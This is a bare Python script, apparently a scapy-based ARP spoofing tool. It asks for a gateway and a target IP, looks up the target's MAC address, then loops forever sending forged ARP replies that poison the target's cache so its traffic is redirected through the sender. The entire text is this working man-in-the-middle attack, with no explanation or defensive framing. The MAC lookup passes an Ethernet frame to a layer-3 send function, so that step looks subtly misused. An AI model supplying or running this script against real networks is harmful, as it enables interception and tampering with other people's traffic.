import scapy.all as s

g = input("gateway ip: ")
t = input("target ip: ")
m = s.sr1(s.Ether(dst="ff:ff:ff:ff:ff:ff")/s.ARP(pdst=t), timeout=2, verbose=0).hwsrc
s.send(s.ARP(op=2, pdst=t, hwdst=m, psrc=g), inter=2, loop=1, verbose=0)